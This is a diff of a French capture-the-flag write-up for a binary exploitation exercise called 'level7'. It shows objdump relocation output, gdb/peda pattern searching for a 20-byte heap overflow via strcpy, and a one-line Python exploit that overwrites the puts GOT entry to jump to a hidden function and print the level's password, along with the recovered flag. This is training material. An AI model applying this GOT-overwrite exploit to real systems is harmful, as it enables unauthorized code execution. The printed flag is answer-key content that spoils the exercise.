@@ -1,5 +1,69 @@
 ## Démarches
 
+- le `./level7` prend au moins 2 paramètres
+    
+    `./level7` 
+
+    > Segmentation fault (core dumped)
+    
+    `./level7 1 1`
+    
+    > ~~
+
+
+- `objdump -R level7`
+    
+    ```
+        level7:     file format elf32-i386
+
+        DYNAMIC RELOCATION RECORDS
+        OFFSET   TYPE              VALUE
+        08049904 R_386_GLOB_DAT    __gmon_start__
+        08049914 R_386_JUMP_SLOT   printf
+        08049918 R_386_JUMP_SLOT   fgets
+        0804991c R_386_JUMP_SLOT   time
+        08049920 R_386_JUMP_SLOT   strcpy
+        08049924 R_386_JUMP_SLOT   malloc
+        08049928 R_386_JUMP_SLOT   puts
+        0804992c R_386_JUMP_SLOT   __gmon_start__
+        08049930 R_386_JUMP_SLOT   __libc_start_main
+        08049934 R_386_JUMP_SLOT   fopen
+    ```
+
+- Le programme utilise strcpy pour copier les arguments qu'on peut overflow
+- Une function `m` non appelée par le *main* print le contenu du fichier *.pass* ouvert dans le *main*. 
+- Avec gdb + peda, on peut déterminer que la taille du buffer est 20
+
+  `pattern create`
+
+  > 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+  
+  `r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'`
+  
+  > Stopped reason: SIGSEGV
+
+  `pattern search`
+
+    ```
+    Registers contain pattern buffer:
+    EDX+0 found at offset: 20
+    Pattern buffer found at:
+    0x0804a018 : offset    0 - size  100 ([heap])
+    0xbffff650 : offset   20 - size    4 ($sp + 0x4 [1 dwords])
+    ```
+
+- Comme dans les levels précédents, on utilise le jump d'une fonction utilisée (ici *puts* - donc après l'ouverture du fichier *.pass* - à l'adresse *08049928*) en y réécrivant l'adresse de destination (la fonction `m` à l'adresse *080484f4*)
+  
+- `./level7 $(python -c 'print("A"*20 + "\x28\x99\x04\x08"+" "+"\xf4\x84\x04\x08")')`
+  > 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1602077241
+<br>
+----
+## Ressources
+- [[Computer Security: A Hands-on Approach] Chapter 4 - Buffer Overflow Attack](http://www.cis.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf)
+
+
+---
+
 - `objdump -d level7`
 ```
     08048521 <main>:
@@ -77,32 +141,4 @@
         8048520:	c3                   	ret
 ```
 
-`objdump -R level7`
-    
-```
-    level7:     file format elf32-i386
-
-    DYNAMIC RELOCATION RECORDS
-    OFFSET   TYPE              VALUE
-    08049904 R_386_GLOB_DAT    __gmon_start__
-    08049914 R_386_JUMP_SLOT   printf
-    08049918 R_386_JUMP_SLOT   fgets
-    0804991c R_386_JUMP_SLOT   time
-    08049920 R_386_JUMP_SLOT   strcpy
-    08049924 R_386_JUMP_SLOT   malloc
-    08049928 R_386_JUMP_SLOT   puts
-    0804992c R_386_JUMP_SLOT   __gmon_start__
-    08049930 R_386_JUMP_SLOT   __libc_start_main
-    08049934 R_386_JUMP_SLOT   fopen
-```
-
-- Le programme utilise strcpy pour copier les arguments
-- Avec gdb + peda, on peut déterminer que la taille du buffer est 20
-
-- Comme dans les levels précédents, on utilise le jump d'une fonction utilisée (ici *puts* à l'adresse *08049928*) en y réécrivant l'adresse de destination (la fonction `m` à l'adresse *080484f4*)
-- `./level7 $(python -c 'print("A"*20 + "\x28\x99\x04\x08"+" "+"\xf4\x84\x04\x08")')`
-  > 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1602077241
-<br>
-----
-## Ressources
-- http://www.cis.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf
+****
